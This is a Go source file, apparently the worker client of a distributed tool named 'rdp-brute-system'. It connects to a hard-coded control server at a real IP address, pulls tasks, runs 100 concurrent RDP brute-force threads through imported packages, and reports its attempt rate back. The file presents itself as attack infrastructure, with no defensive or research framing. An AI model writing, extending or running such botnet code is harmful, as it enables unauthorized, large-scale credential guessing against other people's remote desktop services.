package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"rdp-brute-system/client/comm"
	"rdp-brute-system/client/rdp"
	"rdp-brute-system/client/worker"
	"rdp-brute-system/shared/protocol"
)

func main() {
	serverAddr := flag.String("server", "195.189.96.174:8080", "Address of the control server")
	numThreads := flag.Int("threads", 100, "Number of concurrent threads")
	flag.Parse()

	taskQueue := make(chan protocol.Task, *numThreads)
	resultQueue := make(chan rdp.Result, *numThreads)

	clientWorker := worker.New(1, *numThreads, taskQueue, resultQueue)
	clientWorker.Start()

	clientComm, err := comm.New(*serverAddr, taskQueue, resultQueue)
	if err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}
	go clientComm.Start()

	fmt.Println("Client started. Press Ctrl+C to exit.")

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Monitor and report PPS
	go func() {
		for {
			time.Sleep(5 * time.Second)
			pps := clientWorker.GetPPS()
			fmt.Printf("Current PPS: %d\n", pps)
			clientComm.SendStatus(pps)
		}
	}()

	<-sigChan

	fmt.Println("Shutting down...")
	close(taskQueue)
	clientWorker.Stop()
	clientComm.Stop()
	fmt.Println("Client shut down gracefully.")
}
